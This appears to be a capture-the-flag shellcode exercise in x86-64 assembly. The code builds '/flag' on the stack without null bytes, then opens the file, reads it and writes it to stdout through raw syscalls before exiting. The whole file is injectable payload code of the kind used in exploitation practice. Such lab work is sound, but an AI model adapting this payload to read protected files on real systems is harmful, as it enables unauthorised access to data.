.global _start
_start:
.intel_syntax noprefix

        #open
        xor rsi, rsi
        mov byte ptr [rsp], '/'
        mov byte ptr [rsp+1], 'f'
        mov byte ptr [rsp+2], 'l'
        mov byte ptr [rsp+3], 'a'
        mov byte ptr [rsp+4], 'g'
        xor cl, cl
        mov byte ptr [rsp+5], cl
        mov rdi, rsp
        xor rax, rax
        mov al, 2
        syscall

        #read
        mov rdi, rax
        mov rsi, rsp
        xor rdx, rdx
        mov dl, 100
        xor rax, rax
        syscall

        #write
        xor rdi, rdi
        mov dil, 1
        mov rsi, rsp
        mov rdx, rax
        xor rax, rax
        inc rax
        syscall

        #exit
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        mov dil, 42
        syscall

flag:
        .ascii "/flag"
